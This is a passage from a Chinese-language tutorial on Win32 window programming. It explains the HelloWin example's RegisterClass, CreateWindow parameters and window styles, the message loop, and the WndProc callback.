<p>LPCWSTR类型长指针宽字节型字符串,菜单栏名</p>
<h5 id="lpszclassname">lpszClassName</h5>
<p>LPCWSTR类型长指针宽字节型字符串,描述<strong>窗口类名</strong></p>
<p>例程使用的是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> TCHAR szAppName[] = TEXT(<span class="string">&quot;HelloWin&quot;</span>);</span><br><span class="line">wndclass.lpszClassName = szAppName;</span><br></pre></td></tr></table></figure>
<p>这个窗口类名将是一个<strong>窗口</strong>和该窗口类发生联系的唯一接口</p>
<h4 id="registerclass">RegisterClass</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WINUSERAPI ATOM WINAPI <span class="title function_">RegisterClassW</span><span class="params">(_In_ CONST WNDCLASSW *lpWndClass)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> UNICODE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RegisterClass  RegisterClassW</span></span><br></pre></td></tr></table></figure>
<p>参数是WNDCLASS类型,如果注册成功则返回ATOM,否则返回NULL</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">typedef unsigned short      WORD;</span><br><span class="line">typedef WORD                ATOM; </span><br></pre></td></tr></table></figure>
<p>ATOM也是一个句柄</p>
</blockquote>
<p>例程中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!RegisterClass(&amp;wndclass))</span><br><span class="line">&#123;</span><br><span class="line">    MessageBox(<span class="literal">NULL</span>, TEXT(<span class="string">&quot;This program requires Windows NT!&quot;</span>),szAppName, MB_ICONERROR);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>没有保存RegisterClass的值</p>
<p>为啥这里要判断一下是否注册成功呢?</p>
<p>因为RegisterClass有两个实现,RegisterClassA和RegisterClassW,分别使用ASCII或者Unicode决定传递给窗口的信息的类型</p>
<p>但是WIN98系统上RegisterClassW并没有实现,只是一个桩函数,返回NULL,因此该程序在Win98上运行会寄</p>
<p>然而MessageBoxW也需要宽字符支持啊?谁知Win98就挑了几个需要unicode的函数实现了,包括MessageBoxW</p>
<h3 id="创建窗口类实例">创建窗口类实例</h3>
<p>为啥要打印一个窗口到屏幕这么费劲啊,又是注册又是创建?</p>
<p>刚才注册的是一个模子,这个模子可以有很多实例,模子作为实例的相同部分,每个实例还可以有自己的特点</p>
<p>在CreateWindow函数中我们将会了解到CreateWindow和RegisterClass分别干了啥</p>
<h4 id="hwnd-hwnd">HWND hwnd</h4>
<p>句柄类型,hwnd将来要承载CreateWindow的返回值,用来标识唯一的窗口</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">winnt.h</span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> DECLARE_HANDLE(name) struct name##__&#123;int unused;&#125;; typedef struct name##__ *name</span></span><br><span class="line">windef.h</span><br><span class="line">	<span class="title function_">DECLARE_HANDLE</span><span class="params">(HWND)</span>;</span><br></pre></td></tr></table></figure>
<p>会发现这个<code>DECLARE_HANDLE(name)</code>的宏定义很奇怪,</p>
<p>struct name##,这两个井号是干啥的</p>
<blockquote>
<p>一个井号的时候,其作用为自动添加双引号</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ToString(x) #x</span></span><br><span class="line"><span class="type">char</span>* str = ToString(<span class="number">123132</span>);  <span class="comment">// 就成了str=&quot;123132&quot;;</span></span><br></pre></td></tr></table></figure>
<p>两个井号的时候起拼接作用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> Conn(x,y) x##y </span></span><br><span class="line"><span class="type">int</span>  n = Conn(<span class="number">123</span>,<span class="number">456</span>);   <span class="comment">// 结果就是n=123456;</span></span><br><span class="line"><span class="type">char</span>* str = Conn(<span class="string">&quot;asdf&quot;</span>, <span class="string">&quot;adf&quot;</span>)  <span class="comment">// 结果就是 str = &quot;asdfadf&quot;;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
</blockquote>
<p>那么<code>#define DECLARE_HANDLE(name) struct name##__&#123;int unused;&#125;; typedef struct name##__ *name</code>宏定义展开就是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">HWND__</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> unused;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">HWND__</span> *<span class="title">HWND</span></span></span><br></pre></td></tr></table></figure>
<p>这里##的作用就是拼接HWND和下划线__,下划线的作用是避免命名冲突</p>
<h4 id="createwindow">CreateWindow</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">WINUSERAPI HWND WINAPI <span class="title function_">CreateWindowExW</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ DWORD dwExStyle,</span></span><br><span class="line"><span class="params">    _In_opt_ LPCWSTR lpClassName,</span></span><br><span class="line"><span class="params">    _In_opt_ LPCWSTR lpWindowName,</span></span><br><span class="line"><span class="params">    _In_ DWORD dwStyle,</span></span><br><span class="line"><span class="params">    _In_ <span class="type">int</span> X,</span></span><br><span class="line"><span class="params">    _In_ <span class="type">int</span> Y,</span></span><br><span class="line"><span class="params">    _In_ <span class="type">int</span> nWidth,</span></span><br><span class="line"><span class="params">    _In_ <span class="type">int</span> nHeight,</span></span><br><span class="line"><span class="params">    _In_opt_ HWND hWndParent,</span></span><br><span class="line"><span class="params">    _In_opt_ HMENU hMenu,</span></span><br><span class="line"><span class="params">    _In_opt_ HINSTANCE hInstance,</span></span><br><span class="line"><span class="params">    _In_opt_ LPVOID lpParam)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CreateWindowW(lpClassName, lpWindowName, dwStyle, x, y,\</span></span><br><span class="line"><span class="meta">nWidth, nHeight, hWndParent, hMenu, hInstance, lpParam)\</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line">CreateWindowExW(<span class="number">0L</span>, lpClassName, lpWindowName, dwStyle, x, y,\</span><br><span class="line">nWidth, nHeight, hWndParent, hMenu, hInstance, lpParam)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> UNICODE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CreateWindow  CreateWindowW</span></span><br></pre></td></tr></table></figure>
<p>这个皮球踢了三jio才能落实</p>
<p><code>CreateWindow-&gt;CreateWindowW-&gt;CreateWindowExW</code></p>
<p>从CreateWindowW到CreateWindowExW多了一个参数dwExStyle,并且该参数默认是0,没有其他区别了</p>
<p>该函数的返回值为指向所创建窗口的句柄,历程中是这样写的<code>hwnd = CreateWindow...</code>,即该句柄保存在hwnd中.</p>
<p>该函数执行完毕之后<strong>不会</strong>在屏幕上显示窗口,而是在内存中分配了一块,用来保存传递给CreateWindow函数的各种参数信息,以及一些其他信息.可以通过hwnd句柄调用这些信息</p>
<h5 id="lpclassname">lpClassName</h5>
<p>这就是刚才RegisterClass注册的窗口类,最后一个参数wnd.lpszClassName</p>
<p>例程中该值为L"HelloWin",因此在CreateWindow中才可以使用"HelloWin"作为窗口类名.意思是当前创建的窗口使用"HelloWin"类的设定</p>
<h5 id="lpwindowname">lpWindowName</h5>
<p>窗口标题</p>
<p>例程中该值为<code>TEXT("The Hello Program"), // window caption</code></p>
<p>窗口运行时左上角的标题就是The Hello Program</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220713173027546.png"
alt="image-20220713173027546" />
<figcaption aria-hidden="true">image-20220713173027546</figcaption>
</figure>
<h5 id="dwstyle">dwStyle</h5>
<p>指定窗口的风格</p>
<table>
<colgroup>
<col style="width: 24%" />
<col style="width: 75%" />
</colgroup>
<thead>
<tr>
<th>窗口风格</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>WS_BORDER</td>
<td>创建一个带边框的窗口</td>
</tr>
<tr>
<td>WS_CAPTION</td>
<td>创建一个有标题框的窗口（包含了 WS_BODER 风格）</td>
</tr>
<tr>
<td>WS_CHILD</td>
<td>创建一个子窗口，这个风格的窗口不能拥有菜单也不能与 WS_POPUP
风格合用</td>
</tr>
<tr>
<td>WS_CHILDWINDOW</td>
<td>与 WS_CHILD 相同</td>
</tr>
<tr>
<td>WS_CLIPCHILDREN</td>
<td>当在父窗口内绘图时，排除子窗口区域，在创建父窗口时使用这个风格</td>
</tr>
<tr>
<td>WS_CLIPSIBLINGS</td>
<td>1. 排除子窗口之间的相对区域，也就是，当一个特定的窗口接收到 WM_PAINT
消息时，WS_CLIPSIBLINGS
风格将所有层叠窗口排除在绘图之外，只重绘指定的子窗口 2.
如果未指定该风格，并且子窗口是层叠的，则在重绘子窗口的客户区时，就会重绘邻近的子窗口</td>
</tr>
<tr>
<td>WS_DISABLED</td>
<td>1.
创建一个初始状态为禁止的子窗口，一个禁止状态的窗口不能接受来自用户的输入信息
2. 在窗口创建之后，可以调用 EnableWindow 函数来启用该窗口</td>
</tr>
<tr>
<td>WS_DLGFRAME</td>
<td>创建一个带对话框边框风格的窗口，这种风格的窗口不能带标题条</td>
</tr>
<tr>
<td>WS_GROUP</td>
<td>1. 指定一组“控制窗口”的第一个“控制窗口” 2.
这个“控制窗口”组由第一个“控制窗口”和随后定义的“控制窗口”组成，自第二个“控制窗口”开始每个“控制窗口”具有
WS_GROUP 风格 3. 每个组的第一个“控制窗口”带有 WS_TABSTOP
风格，从而使用户可以在组间移动 4.
用户随后可以使用光标在组内的控制间改变键盘焦点</td>
</tr>
<tr>
<td>WS_HSCROLL</td>
<td>创建一个有水平滚动条的窗口</td>
</tr>
<tr>
<td>WS_ICONIC</td>
<td>创建一个初始状态为最小化状态的窗口，与 WS_MINIMIZE 风格相同</td>
</tr>
<tr>
<td>WS_MAXIMIZE</td>
<td>创建一个初始状态为最大化状态的窗口</td>
</tr>
<tr>
<td>WS_MAXIMIZEBOX</td>
<td>创建一个具有最大化按钮的窗口，该风格不能与 WS_EX_CONTEXTHELP
风格同时出现，同时必须指定 WS_SYSMENU 风格</td>
</tr>
<tr>
<td>WS_MINIMIZE</td>
<td>创建一个初始状态为最小化状态的窗口，与 WS_ICONIC 风格相同</td>
</tr>
<tr>
<td>WS_MINIMIZEBOX</td>
<td>创建一个具有最小化按钮的窗口，该风格不能与 WS_EX_CONTEXTHELP
风格同时出现，同时必须指定 WS_SYSMENU 风格</td>
</tr>
<tr>
<td>WS_OVERLAPPED</td>
<td>产生一个层叠的窗口，一个层叠的窗口有一个标题条和一个边框，与
WS_TILED 风格相同</td>
</tr>
<tr>
<td>WS_OVERLAPPEDWINDOW</td>
<td>相当于（WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_THICKFRAME |
WS_MINIMIZEBOX | WS_MAXIMIZEBOX），与 WS_TILEDWINDOW 风格相同</td>
</tr>
<tr>
<td>WS_POPUP</td>
<td>创建一个弹出式窗口，该风格不能与 WS_CHILD 风格同时使用。</td>
</tr>
<tr>
<td>WS_POPUPWINDOW</td>
<td>相当于（WS_POPUP | WS_BORDER | WS_SYSMENU），但 WS_CAPTION 和
WS_POPUPWINDOW 必须同时设定才能使窗口某单可见</td>
</tr>
<tr>
<td>WS_SIZEBOX</td>
<td>创建一个可调边框的窗口，与 WS_THICKFRAME 风格相同</td>
</tr>
<tr>
<td>WS_SYSMENU</td>
<td>创建一个在标题条上带有窗口菜单的窗口，必须同时设定 WS_CAPTION
风格</td>
</tr>
<tr>
<td>WS_TABSTOP</td>
<td>1. 创建一个“控制窗口”，在用户按下 Tab 键时可以获得键盘焦点。 2. 按下
Tab 键后使键盘焦点转移到下一具有 WS_TABSTOP 风格的“控制窗口”</td>
</tr>
<tr>
<td>WS_THICKFRAME</td>
<td>创建一个具有可调边框的窗口，与 WS_SIZEBOX 风格相同</td>
</tr>
<tr>
<td>WS_TILED</td>
<td>产生一个层叠的窗口，一个层叠的窗口有一个标题和一个边框，与
WS_OVERLAPPED 风格相同</td>
</tr>
<tr>
<td>WS_TILEDWINDOW</td>
<td>相当于（WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_THICKFRAME |
WS_MINIMIZEBOX | WS_MAXIMIZEBOX），与 WS_OVERLAPPEDWINDOW 风格相同</td>
</tr>
<tr>
<td>WS_VISIBLE</td>
<td>创建一个初始状态为可见的窗口</td>
</tr>
<tr>
<td>WS_VSCROLL</td>
<td>创建一个有垂直滚动条的窗口</td>
</tr>
</tbody>
</table>
<p>例程中该值为<code>WS_OVERLAPPEDWINDOW</code>,</p>
<p>相当于<code>WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_THICKFRAME | WS_MINIMIZEBOX | WS_MAXIMIZEBOX</code></p>
<p><code>层叠 | 有标题 | 标题条上有窗口菜单 | 可调边框 | 可最小化 | 可最大化</code></p>
<h5 id="x">x</h5>
<p>指定窗口初始水平位置对于层叠或者弹出式窗口,x是相对屏幕左上角的位移</p>
<p>对于子窗口,x是相对于父窗口左上角的偏移</p>
<p>如果该值为<code>CW_USEDEFAULT</code>则系统为窗口选择缺省的左上角左边并忽略y(该值只对层叠窗口有效)</p>
<p><code>#define CW_USEDEFAULT    ((int)0x80000000)</code></p>
<p>例程中就使用了<code>CW_USEDEFAULT</code></p>
<h5 id="y">y</h5>
<p>类似于<code>x</code></p>
<h5 id="nwidth">nWidth</h5>
<p>指定窗口宽度</p>
<h5 id="nheight">nHeight</h5>
<p>指定窗口高度</p>
<h5 id="hwndparent">hWndParent</h5>
<p>父窗口的句柄</p>
<p>例程中该值为<code>NULL</code>,即没有父窗口,显然这是第一个窗口,还没有第二个窗口,谈不上父子关系</p>
<p>注册子窗口时这里要写父窗口的句柄</p>
<h5 id="hmenu">hMenu</h5>
<p>窗口菜单句柄</p>
<p>例程中该值为<code>NULL</code>,看来不是必要的</p>
<p>对于子窗口来说,父窗口过程在建立子窗口的时候需要维护一个子窗口ID,就是在hMenu上指定</p>
<h5 id="hinstance-1">hInstance</h5>
<p>与窗口相关联的模块实例的句柄</p>
<p>例程中该值为<code>hInstance</code>,也就是<code>winmain</code>的第一个参数,目前阶段只要是<code>hInstance</code>基本都是来自<code>winmain</code>的参数.</p>
<h5 id="lpparam">lpParam</h5>
<p>创建窗口之后发送给该窗口过程的WM_CREATE消息的lParam参数</p>
<p>例程中该值为<code>NULL</code>,目前阶段一般都是<code>NULL</code>,不管他了</p>
<h3 id="显示窗口实例">显示窗口实例</h3>
<h4 id="showwindow">ShowWindow</h4>
<p>RegisterClass注册了窗口类,</p>
<p>CreateWindow创建了窗口实例,</p>
<p>下面就差一步就能将该实例显示出来了</p>
<p>这就是<code>ShowWindow(hwnd,iCmdShow)</code>函数的作用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WINUSERAPI BOOL WINAPI <span class="title function_">ShowWindow</span><span class="params">(_In_ HWND hWnd,_In_ <span class="type">int</span> nCmdShow)</span>;</span><br></pre></td></tr></table></figure>
<p><code>hwnd</code>是<code>CreateWindow</code>的返回值,也就是窗口实例的句柄</p>
<p><code>iCmdShow</code>是<code>winmain</code>函数的第四个参数,即命令行参数,此参数决定窗口的显示方式,最大化最小化或者正常.</p>
<p>如果显示成功则返回TRUE,否则返回FALSE</p>
<h4 id="updatewindow">UpdateWindow</h4>
<p>当客户区有改动时使用本函数重绘客户区</p>
<p>实际上通过向窗口过程发送<code>WM_PAINT</code>消息完成</p>
<p>参数是窗口实例句柄,意思是更新该句柄对应窗口实例</p>
<h3 id="消息循环">消息循环</h3>
<h4 id="消息">消息</h4>
<p>举一个直观例子,键鼠动作就属于消息.</p>
<p>操作系统负责用结构体记录消息,并发送给相应线程的消息队列,每个<strong>线程</strong>都有一个消息队列</p>
<p>消息结构体:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagMSG</span> &#123;</span></span><br><span class="line">    HWND        hwnd;</span><br><span class="line">    UINT        message;</span><br><span class="line">    WPARAM      wParam;</span><br><span class="line">    LPARAM      lParam;</span><br><span class="line">    DWORD       time;</span><br><span class="line">    POINT       pt;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _MAC</span></span><br><span class="line">    DWORD       lPrivate;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125; MSG, *PMSG, NEAR *NPMSG, FAR *LPMSG;</span><br></pre></td></tr></table></figure>
<p>比如当点选窗口W的关闭按钮X时,操作系统会捕获该鼠标动作,封装成MSG结构体,</p>
<p>然后操作系统将把该结构体塞到对应线程的消息队列中</p>
<h5 id="hwnd">hwnd</h5>
<p>但是塞给哪个线程的消息队列呢?通过该结构体的第一个参数hwnd窗口句柄.</p>
<p>如果该值为NULL则是一个线程消息</p>
<blockquote>
<p>一个线程可以有多个窗口,一个进程可以有多个线程</p>
</blockquote>
<h5 id="message">message</h5>
<p>发送啥消息呢?通过第二个参数<code>message</code>决定,该值是个枚举类型</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> WM_NULL                         0x0000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WM_CREATE                       0x0001<span class="comment">//窗口创建伊始操作系统产生的消息</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WM_DESTROY                      0x0002</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WM_MOVE                         0x0003</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WM_SIZE                         0x0005</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WM_ACTIVATE                     0x0006</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
</blockquote>
<h5 id="wparamlparam">wParam/lParam</h5>
<p>额外信息,要和<code>message</code>配合使用,有些信息不需要额外描述,一个<code>message</code>就够了</p>
<h5 id="time">time</h5>
<p>消息进入线程消息队列的时间</p>
<h5 id="pt">pt</h5>
<p>指针类型,指向结构体<code>Point</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagPOINT</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    LONG  x;</span><br><span class="line">    LONG  y;</span><br><span class="line">&#125; POINT, *PPOINT, NEAR *NPPOINT, FAR *LPPOINT;</span><br></pre></td></tr></table></figure>
<p>描述消息进入消息队列时,鼠标光标位置</p>
<h4 id="getmessagew">GetMessageW</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">WINUSERAPI BOOL WINAPI <span class="title function_">GetMessageW</span><span class="params">(</span></span><br><span class="line"><span class="params">    _Out_ LPMSG lpMsg,</span></span><br><span class="line"><span class="params">    _In_opt_ HWND hWnd,</span></span><br><span class="line"><span class="params">    _In_ UINT wMsgFilterMin,</span></span><br><span class="line"><span class="params">    _In_ UINT wMsgFilterMax)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> UNICODE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GetMessage  GetMessageW</span></span><br></pre></td></tr></table></figure>
<p>本函数的作用是从线程消息队列中取出一条消息,将该消息保存在第一个参数lpMsg中(目的地).</p>
<blockquote>
<p>因此例程中在<code>winmain</code>函数栈下开了一个<code>MSG msg;</code>用于存放<code>GetMessageW</code>获取到的信息</p>
<p><code>GetMessageW</code>传递msg作为参数时使用的是引用传递<code>GetMessage(&amp;msg, NULL, 0, 0)</code></p>
</blockquote>
<p>第二个参数hWnd指定接收属于哪个窗口的消息,如果设置为NULL则表示接收属于调用线程的所有窗口的窗口消息.</p>
<blockquote>
<p>这是由于一个线程可以有多个窗口,关闭A窗口的消息要准确地发送给A窗口,不能把B窗口关喽</p>
</blockquote>
<p>第三个参数<code>wMsgFilterMin</code>指定要获取的消息的最小值,通常为0</p>
<p>第四个参数<code>wMsgFilterMax</code>指定要获取消息的最大值,如果<code>wMsgFilterMin</code>和<code>wMsgFilterMax</code>都是0则接收所有消息</p>
<p>例程中这两个值全是0,也就是接收所有消息</p>
<h4 id="translatemessagemsg">TranslateMessage(&amp;msg)</h4>
<p>线程将msg消息还给操作系统,让操作系统进行键盘消息的转换,转换完后操作系统将结果还是放在msg中还给线程</p>
<h4 id="dispatchmessagemsg">DispatchMessage(&amp;msg)</h4>
<p>线程收到操作系统返回的转换信息,又将msg还给操作系统.</p>
<p>操作系统将该消息发送给相应<strong>窗口过程WndProc</strong>进行处理,即操作系统调用了<strong>窗口过程</strong></p>
<blockquote>
<p>这里的窗口过程也就是RegisterClass时lpfnWndProc指定的回调函数</p>
</blockquote>
<p>窗口过程仅针对当前消息做出相应<strong>处理</strong>,然后将控制还给操作系统.操作</p>
<p>Dispatch,分发,这里的意思是操作系统根据消息msg的hwnd句柄,决定分发给回调函数进行处理还是返回内核进行处理</p>
<p>细节是咋样的,在此不深究</p>
<h4 id="循环处理">循环处理</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (GetMessage(&amp;msg, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">    TranslateMessage(&amp;msg);</span><br><span class="line">    DispatchMessage(&amp;msg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这是一个固定格式,当前线程不断检查其消息队列中是否有消息,如果有则msg是有效负载,否则msg空.</p>
<p>msg不管是不是空,都会经历整个过程,空负载也就是蜻蜓点水地进入转换和分发函数立刻判断失效返回.</p>
<h3 id="窗口过程">窗口过程</h3>
<p>在消息循环中,我们直到窗口过程不是线程自己想要调用就调用的,需要操作系统来调用窗口过程</p>
<p>所谓窗口过程,实际上就是注册窗口类时,<code>wndclass.lpfnWndProc</code>这个函数指针指向的函数</p>
<p>前面消息经过一系列踢皮球,不管是os给线程啊,还是线程还给os啊,都只是传来传去,没有对窗口造成任何影响.</p>
<p>最终这个皮球踢给了<code>WndProc</code>函数,他势必要做出某些改变</p>
<p>例程中该函数是这样定义的:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">LRESULT CALLBACK <span class="title function_">WndProc</span><span class="params">(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)</span></span><br><span class="line">&#123;</span><br><span class="line">    HDC hdc;</span><br><span class="line">    PAINTSTRUCT ps;</span><br><span class="line">    RECT rect;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (message)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> WM_CREATE:</span><br><span class="line">       PlaySound(TEXT(<span class="string">&quot;SenbonZakura.wav&quot;</span>), <span class="literal">NULL</span>, SND_FILENAME | SND_ASYNC);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">case</span> WM_PAINT:</span><br><span class="line">        hdc = BeginPaint(hwnd, &amp;ps);</span><br><span class="line"></span><br><span class="line">        GetClientRect(hwnd, &amp;rect);</span><br><span class="line"></span><br><span class="line">        DrawText(hdc, TEXT(<span class="string">&quot;Hello, Windows 98!&quot;</span>), <span class="number">-1</span>, &amp;rect,</span><br><span class="line">            DT_SINGLELINE | DT_CENTER | DT_VCENTER);</span><br><span class="line">        EndPaint(hwnd, &amp;ps);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> WM_DESTROY:</span><br><span class="line">        PostQuitMessage(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> DefWindowProc(hwnd, message, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>暂且先不管细节,但就从switch(message)-case可以看出,这是在对message参数传进来的消息进行分拣,例程中给出了三种分拣情况</p>
<p><code>case WM_CREATE</code>,当窗口创建时,即CreateWindow返回前</p>
<p><code>case WM_PAINT</code>当窗口绘制完毕时</p>
<p><code>case WM_DESTROY</code>当窗口关闭时</p>
<p>现在开始管细节</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LRESULT CALLBACK WndProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam);</span><br></pre></td></tr></table></figure>
<p>这四个参数正好是<code>MSG</code>结构体的前四个成员</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagMSG</span> &#123;</span></span><br><span class="line">    HWND        hwnd;</span><br><span class="line">    UINT        message;</span><br><span class="line">    WPARAM      wParam;</span><br><span class="line">    LPARAM      lParam;</span><br><span class="line">    DWORD       time;</span><br><span class="line">    POINT       pt;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _MAC</span></span><br><span class="line">    DWORD       lPrivate;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125; MSG, *PMSG, NEAR *NPMSG, FAR *LPMSG;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>hwnd,窗口句柄,作用是告诉WndProc函数,将要根据函数进行的处理,要作用于哪一个窗口</p>
<p>message,告诉WndProc函数,发生甚么事了,指导WndProc做出相应处理</p>
<p>wParam,lParam,配合message,当message一句话说不清发生甚么事的时候,就需要
多说一句甚至两句描述清楚发生了甚么事</p>
<blockquote>
<p>这就好比病人去<strong>中医院</strong>已经看完了大夫,要去药房拿药</p>
<p>病人看大夫,大夫一眼顶针,总结出病人得了什么病,</p>
<p>但是为了挣钱,防止病人自己去其他平价药店买要,因此大夫将处方写的只能药房护士看得懂,病人你休想看懂</p>
<p>病人没办法拿着处方去了药房,这个药房护士就是WndProc函数,他一看,</p>
<p>第一行写了个"玛卡巴卡",哦,皮燕子有毛病</p>
<p>第二行写了个"妈了巴子",哦,要吃人参,树皮,坷拉蛋子</p>
<p>第三行写了个"古西迪西",哦,人参两公斤,树皮两张,坷拉蛋子两公斤,吃不死你</p>
<p>药房护士就开出了药,完成了其使命.</p>
</blockquote>
<p>对于例程中的唯一的窗口,hwnd显而易见的来自唯一一次调用的CreateWindow创建的窗口</p>
